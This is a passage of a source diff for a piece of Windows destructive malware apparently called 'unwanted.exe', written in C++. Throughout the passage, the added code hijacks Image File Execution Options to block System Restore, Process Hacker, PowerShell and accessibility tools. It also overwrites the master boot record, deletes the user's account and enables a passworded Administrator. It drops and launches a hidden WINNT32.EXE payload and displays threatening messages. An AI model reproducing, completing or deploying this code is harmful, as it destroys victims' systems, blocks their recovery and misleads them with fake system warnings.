+    ShellExecuteA(NULL, NULL, "REG", "ADD \u0022HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\IOBITUnlocker.exe\u0022 /v Debugger /d \u0022C:\\Windows\\System32\\cmd.exe /c color 04 & title YOU ARE TRYING TO KILL ME HUH??? &  echo THERE IS NO ESCAPE, YOUR COMPUTER IS MINE & echo you cannot run IOBITUnlocker.exe &pause >nul&\u0022", NULL, SW_HIDE);
+    ShellExecuteA(NULL, NULL, "REG", "ADD \u0022HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\rstrui.exe\u0022 /v Debugger /d \u0022C:\\Windows\\System32\\cmd.exe /c color 0a & title System Restore &  echo Nice try &pause >nul&\u0022", NULL, SW_HIDE);
+    ShellExecuteA(NULL, NULL, "REG", "ADD \u0022HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\ProcessHacker.exe\u0022 /v Debugger /d \u0022C:\\Windows\\System32\\cmd.exe /c color 04 & title PROCESSHACKER.EXE &  echo THERE IS NO ESCAPE, YOUR COMPUTER IS MINE & echo you cannot run PROCESSHACKER.EXE &pause >nul&\u0022", NULL, SW_HIDE);
+    ShellExecuteA(NULL, NULL, "REG", "ADD \u0022HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Powershell.exe\u0022 /v Debugger /d \u0022C:\\Windows\\System32\\cmd.exe /c title POWERSHELL.EXE &  echo THERE IS NO ESCAPE, YOUR COMPUTER IS MINE & echo you cannot run POWERSHELL &pause >nul&\u0022", NULL, SW_HIDE);
+    ShellExecuteA(NULL, NULL, "REG", "ADD \u0022HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Utilman.exe\u0022 /v Debugger /d \u0022C:\\Windows\\System32\\cmd.exe /c color 04 & title UTILMAN.EXE &  echo THERE IS NO ESCAPE, YOUR COMPUTER IS MINE &pause >nul&\u0022", NULL, SW_HIDE);
+    ShellExecuteA(NULL, NULL, "REG", "ADD \u0022HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\SetHC.exe\u0022 /v Debugger /d \u0022C:\\Windows\\System32\\cmd.exe /c color 04 & title SETHC.EXE &  echo THERE IS NO ESCAPE, YOUR COMPUTER IS MIN &pause >nul&\u0022", NULL, SW_HIDE);
 
     RegDeleteKey(HKEY_CLASSES_ROOT, TEXT("Folder\\shell\\opennewprocess"));
     RegDeleteKey(HKEY_CLASSES_ROOT, TEXT("Folder\\shell\\opennewtab"));
@@ -833,20 +787,13 @@ skiplogonuidam:
 
     if (argc > 1) {
         if (!lstrcmpW(argv[1], L"nosettings")) {
-            
-        }
-        else
-        {
-            DisableRunDLL32();
-            DisableSettings();
+            goto nosettings;
         }
     }
-    else
-    {
-        DisableRunDLL32();
-        DisableSettings();
-    }
+    DisableRunDLL32();
+    DisableSettings();
 
+nosettings:
     // Start Menu not working
     HKEY regHandlea;
     const char* dwValuea = "accessdenied";
@@ -894,9 +841,12 @@ skiplogonuidam:
 
 void NoUnwanted1() {
     // This makes unwanted.exe no working
-
-    //RegCreateSet(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\unwanted.exe"), TEXT("Debugger"), REG_SZ, TEXT("C:\\Windows\\System32\\cmd.exe /c color 04 & title UNWANTED.EXE &  echo Running viruses two times is bad for health 🤪🤪🤪🤪🤪🤪 &pause >nul"), sizeof(TEXT("C:\\Windows\\System32\\cmd.exe /c color 04 & title UNWANTED.EXE &  echo Running viruses two times is bad for health 🤪🤪🤪🤪🤪🤪 &pause >nul")));
-    RegCreateSet(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\unwanted.exe"), TEXT("Debugger"), REG_SZ, TEXT("winresume.exe"), sizeof(TEXT("winresume.exe")));
+    HKEY regHandle8;
+    const char* dwValue8 = "hello?";
+    BYTE* data8 = (BYTE*)&dwValue8;
+    RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\unwanted.exe"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandle8, NULL);
+    RegSetValueEx(regHandle8, TEXT("Debugger"), 0, REG_SZ, data8, sizeof(DWORD));
+    RegCloseKey(regHandle8);
 }
 
 void NoUnwanted0() {
@@ -920,7 +870,7 @@ DWORD WINAPI StartBeep(LPVOID parameter) {
 }
 
 int RandBeep() {
-    Beep(800 + rand() % 600, 100);
+    Beep(rand() * 20, 1000);
     Sleep(100);
     return 0;
 }
@@ -930,22 +880,21 @@ void CreateKillWindows() {
     if (PathFileExistsA("C:\\Program Files\\Common Files\\WINNT32.EXE") != TRUE) {
 
         /* Create KillWindows program for some payloads */
-        HANDLE kwi = CreateFileA("C:\\Program Files\\Common Files\\WINNT32.EXE", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_SYSTEM, 0);
+        HANDLE kwi = CreateFileA("C:\\Program Files\\Common Files\\WINNT32.EXE", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
 
         WriteFile(kwi, kwp, kwp_len, &wb, NULL);
 
         CloseHandle(kwi);
 
-        ShellExecuteA(NULL, NULL, "cmd", "/c attrib \u0022C:\\Program Files\\Common Files\\WINNT32.EXE\u0022 +s +h", NULL, SW_HIDE);
+        /* Attribute it System and hide */
+        ShellExecuteA(NULL, NULL, "attrib", "+s +h \u0022C:\\Program Files\\Common Files\\WINNT32.EXE\u0022", NULL, SW_HIDE);
     }
     else
     {
-        if (InternetCheckConnectionW(L"https://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0) == TRUE) {
-            ShellExecuteW(NULL, NULL, L"cmd", L"/c color 04 & title 😀😁😎☺😎🤔😣😱🥵😳😨😨🤪🤪🤪🤤😦😦 & echo I KNOW YOU RAN THIS MALWARE MANY TIMES & echo I KNOW WHERE YOU LIVE & pause > nul", NULL, SW_NORMAL);
-            Sleep(2000);
-            ShellExecuteA(NULL, NULL, "C:\\Program Files\\Common Files\\WINNT32.EXE", NULL, NULL, SW_NORMAL);
-            ShellExecuteA(NULL, NULL, "C:\\Program Files\\Common Files\\WINNT32.EXE", NULL, NULL, SW_NORMAL);
-        }
+        ShellExecuteA(NULL, NULL, "cmd", "/c echo NEVER RUN MALWARE MUCH TIMES & pause > nul", NULL, SW_NORMAL);
+        Sleep(2000);
+        ShellExecuteA(NULL, NULL, "C:\\Program Files\\Common Files\\WINNT32.EXE", NULL, NULL, SW_NORMAL);
+        ShellExecuteA(NULL, NULL, "C:\\Program Files\\Common Files\\WINNT32.EXE", NULL, NULL, SW_NORMAL);
     }
 }
 
@@ -968,7 +917,9 @@ void StartFuckingPC() {
     RegSetValueEx(regHandle2, TEXT("dontdisplaylastusername"), 0, REG_DWORD, data2, sizeof(DWORD));
     RegCloseKey(regHandle2);
 
-    ShellExecuteA(NULL, NULL, "cmd", " /c net user %username% /delete & net user Administrator /active:yes & net user Administrator iwantedthis", NULL, SW_HIDE);
+    ShellExecuteA(NULL, NULL, "cmd", " /c net user %username% /delete", NULL, SW_HIDE);
+    ShellExecuteA(NULL, NULL, "cmd", " /c net user Administrator /active:yes", NULL, SW_HIDE);
+    ShellExecuteA(NULL, NULL, "cmd", " /c net user Administrator iwantedthis", NULL, SW_HIDE);
 }
 
 void StartErrorSpam() {
@@ -977,27 +928,20 @@ void StartErrorSpam() {
     LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
     if (argc > 1) {
         if (!lstrcmpW(argv[1], L"skipdestroymbr")) {
-            
+            goto skipdestroymbr1;
         }
         else
         {
-            DestroyMBR();
+            // Destroy MBR
         }
     }
-    else
-    {
-        DestroyMBR();
-    }
-    
-    CreateThread(NULL, NULL, &payloadThread, &StartBeep, NULL, NULL);
-    CreateThread(NULL, 4096, &STARTripmessages, NULL, NULL, NULL);
-    Sleep(200);
-    CreateThread(NULL, NULL, &payloadThread, &killWindowsInstant, NULL, NULL);
-
-    Sleep(992);
-
+    DestroyMBR();
+    skipdestroymbr1:
     StartFuckingPC();
     DisablePowerOptions();
+    CreateThread(NULL, NULL, &payloadThread, &StartBeep, NULL, NULL);
+    CreateThread(NULL, 4096, &STARTripmessages, NULL, NULL, NULL);
+    CreateThread(NULL, NULL, &payloadThread, &killWindowsInstant, NULL, NULL);
 }
 
 /* Download a file for test Internet connection */
@@ -1012,7 +956,7 @@ void TestInternetConnection() {
         {
             int msgboxID = MessageBox(
                 NULL,
-                (LPCWSTR)L"Unknown hard error:\r\nBetter working with Internet Connected",
+                (LPCWSTR)L"Unknown hard error:\r\nERR_INTERNET_NOCONNECTED",
                 (LPCWSTR)L"unwanted.exe - System Warning",
                 MB_ICONERROR | MB_OK
             );
@@ -1022,17 +966,15 @@ void TestInternetConnection() {
         LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
         if (argc > 1) {
             if (!lstrcmpW(argv[1], L"skipdestroymbr")) {
-                
+                goto skipdestroymbr1;
             }
             else
             {
-                DestroyMBR();
+                // Destroy MBR
             }
         }
-        else
-        {
-            DestroyMBR();
-        }
+        DestroyMBR();
+    skipdestroymbr1:
         StartFuckingPC();
         DisablePowerOptions();
         CreateThread(NULL, NULL, &payloadThread, &StartBeep, NULL, NULL);
@@ -1042,49 +984,6 @@ void TestInternetConnection() {
     };
 
 }
-
-void TestInternetConnection2() {
-    if (InternetCheckConnectionW(L"https://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0) == TRUE) {
-        // success        
-    }
-    else // else kills os
-    {
-        CreateThread(NULL, NULL, &payloadThread, &StartErrorSpam, NULL, NULL);
-        int DisplayResourceNAMessageBox();
-        {
-            int msgboxID = MessageBox(
-                NULL,
-                (LPCWSTR)L"message: who does live without internet?",
-                (LPCWSTR)L"unwanted.exe - System Warning",
-                MB_ICONERROR | MB_OK
-            );
-        };
-
-        int argc;
-        LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
-        if (argc > 1) {
-            if (!lstrcmpW(argv[1], L"skipdestroymbr")) {
-
-            }
-            else
-            {
-                DestroyMBR();
-            }
-        }
-        else
-        {
-            DestroyMBR();
-        }
-        StartFuckingPC();
-        DisablePowerOptions();
-        CreateThread(NULL, NULL, &payloadThread, &StartBeep, NULL, NULL);
-        CreateThread(NULL, 4096, &STARTripmessages, NULL, NULL, NULL);
-        CreateThread(NULL, NULL, &payloadThread, &killWindowsInstant, NULL, NULL);
-
-    };
-
-}
-
 void NormalComputer() {
     // Shown when this is not a normal computer
     // This payload is shown when delete WINLOGON.EXE from system32
@@ -1127,7 +1026,7 @@ void superPowerFulMainPayload() {
     Sleep(1500);
     CreateThread(NULL, NULL, &payloadThread, &payloadMessageBox, NULL, NULL);
     Sleep(4500);
-    ShellExecuteA(NULL, NULL, "wordpad", "\u0022C:\\Program Files\\Common Files\\system\\paint.rtf\u0022", NULL, SW_SHOWDEFAULT);
+    ShellExecuteA(NULL, NULL, "wordpad", "\u0022C:\\Program Files\\Common Files\\system\\Documento.rtf\u0022", NULL, SW_SHOWDEFAULT);
     Sleep(8500);
     ShellExecuteA(NULL, NULL, "control", NULL, NULL, SW_SHOWDEFAULT);
     Sleep(7900);
@@ -1152,27 +1051,10 @@ void superPowerFulMainPayload() {
     for (;;) {
         // still there, wait for windows dies
     }
-   }
 
-DWORD WINAPI warningfinalpayload(LPVOID parameter) {
-    Sleep(5000 + rand() % 1000);
-    MessageBox(
-        NULL,
-        (LPCWSTR)L"please wait until the final payload is finished\r\nuntil then you can still using your computer =)", // Warning message box
-        (LPCWSTR)L"Warning",
-        MB_ICONWARNING | MB_OK
-    );
-    return 0;
 }
 
-int beepsandlights() {
-    while (1) {
-        Beep(850 + rand() % 500, 100);
-        Sleep(500 + rand() % 1000);
-        int y = rand() % sh, h = sh - rand() % sh - (sh / 1 - 1);
 
-        BitBlt(hdc, 0, y, sw, h, hdc, rand() % 2, y + rand() % 2, SRCAND);
-        Sleep(500 + rand() % 1000);
-        return 0;
-    }
-}
+// TEST SIDE!
+
+// to-do find out how to write to string on c++
